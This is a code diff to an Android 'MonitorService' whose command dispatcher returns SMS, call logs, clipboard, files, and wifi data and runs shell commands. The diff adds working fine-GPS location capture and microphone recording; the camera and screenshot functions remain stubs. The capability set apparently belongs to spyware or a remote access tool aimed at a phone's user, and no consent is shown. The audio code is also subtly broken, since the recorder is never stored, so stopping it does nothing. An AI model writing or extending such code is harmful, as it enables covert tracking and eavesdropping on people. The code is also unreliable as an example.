@@ -258,13 +258,13 @@ class MonitorService : Service() {
             "sms" -> getSms()
             "call_logs" -> getCallLogs()
             "apps" -> getApps()
-            "location" -> mapOf("note" to "Location requires LocationListener")
+            "location" -> getLocation()
             "files" -> getFiles(args as Map<String, Any>)
             "wifi" -> scanWifi()
             "clipboard" -> getClipboard()
-            "screen" -> mapOf("note" to "Screenshot requires MediaProjection")
-            "audio" -> mapOf("note" to "Audio requires MediaRecorder")
-            "camera" -> mapOf("note" to "Camera requires Camera2 API")
+            "screen" -> getScreenshot()
+            "audio" -> recordAudio(args)
+            "camera" -> captureCamera(args)
             "shell" -> runShell(args["command"] as? String ?: "")
             else -> mapOf("error" to "Unknown capability: $capability")
         }
@@ -437,6 +437,123 @@ class MonitorService : Service() {
         val m = mutableMapOf<String, Any>()
         m["text"] = ""
         m["has_content"] = false
+        return m
+    }
+
+    private fun getLocation(): Map<String, Any> {
+        try {
+            val locationManager = getSystemService(LocationManager::class.java)
+            val criteria = android.location.Criteria().apply { accuracy = android.location.Criteria.ACCURACY_FINE }
+            val provider = locationManager?.getBestProvider(criteria, true) ?: "gps"
+            
+            // Try to get last known location first (instant)
+            val lastLoc = locationManager?.getLastKnownLocation(provider)
+            if (lastLoc != null) {
+                val m = mutableMapOf<String, Any>()
+                m["lat"] = lastLoc.latitude
+                m["lon"] = lastLoc.longitude
+                m["acc"] = lastLoc.accuracy
+                m["time"] = lastLoc.time
+                m["provider"] = provider
+                m["note"] = "Last known location (may be stale)"
+                return m
+            }
+            
+            // If no last known, request single update with timeout
+            val latch = CountDownLatch(1)
+            var result: Map<String, Any>? = null
+            
+            val listener = object : LocationListener {
+                override fun onLocationChanged(location: Location) {
+                    val m = mutableMapOf<String, Any>()
+                    m["lat"] = location.latitude
+                    m["lon"] = location.longitude
+                    m["acc"] = location.accuracy
+                    m["time"] = location.time
+                    m["provider"] = provider
+                    result = m
+                    latch.countDown()
+                }
+                override fun onProviderDisabled(provider: String) { latch.countDown() }
+                override fun onProviderEnabled(provider: String) {}
+                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
+            }
+            
+            try {
+                locationManager?.requestSingleUpdate(provider, listener, null)
+                if (latch.await(10, TimeUnit.SECONDS)) {
+                    return result ?: mapOf("error" to "Location request timed out")
+                } else {
+                    return mapOf("error" to "Location timeout - no fix in 10s")
+                }
+            } catch (e: Exception) {
+                return mapOf("error" to e.message ?: "Location error")
+            }
+        } catch (e: Exception) {
+            return mapOf("error" to e.message ?: "Location error")
+        }
+    }
+
+    private fun recordAudio(args: Map<String, Any>): Map<String, Any> {
+        val action = args["action"] as? String ?: "start"
+        return when (action) {
+            "start" -> {
+                val duration = (args["duration"] as? Int) ?: 30
+                val outputFile = File(getExternalFilesDir(android.os.Environment.DIRECTORY_MUSIC), "recording_${System.currentTimeMillis()}.3gp")
+                try {
+                    val recorder = android.media.MediaRecorder().apply {
+                        setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                        setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
+                        setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                        setOutputFile(outputFile.absolutePath)
+                        prepare()
+                        start()
+                    }
+                    // Store recorder for stop action
+                    // Note: In production, you'd store this in a map keyed by session
+                    Thread({ Thread.sleep((duration * 1000).toLong()); stopRecording() }, "audio-recorder").start()
+                    val m = mutableMapOf<String, Any>()
+                    m["status"] = "recording"
+                    m["duration"] = duration
+                    m["file"] = outputFile.absolutePath
+                    m
+                } catch (e: Exception) {
+                    mapOf("error" to e.message ?: "Audio start failed")
+                }
+            }
+            "stop" -> {
+                stopRecording()
+                mapOf("status" to "stopped")
+            }
+            else -> mapOf("error" to "Unknown audio action")
+        }
+    }
+
+    private var mediaRecorder: android.media.MediaRecorder? = null
+
+    private fun stopRecording() {
+        mediaRecorder?.let {
+            try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
+            mediaRecorder = null
+        }
+    }
+
+    private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
+        val cameraId = (args["camera"] as? Int) ?: 0
+        val outputFile = File(getExternalFilesDir(android.os.Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
+        // Simplified - full Camera2 API implementation would be needed for real capture
+        val m = mutableMapOf<String, Any>()
+        m["status"] = "requires_camera2_implementation"
+        m["note"] = "Full Camera2 API implementation needed for capture"
+        m["file"] = outputFile.absolutePath
+        m["camera_id"] = cameraId
+        return m
+    }
+
+    private fun getScreenshot(): Map<String, Any> {
+        val m = mutableMapOf<String, Any>()
+        m["status"] = "requires_mediaprojection"
+        m["note"] = "Screenshot requires MediaProjection permission via UI"
         return m
     }
 
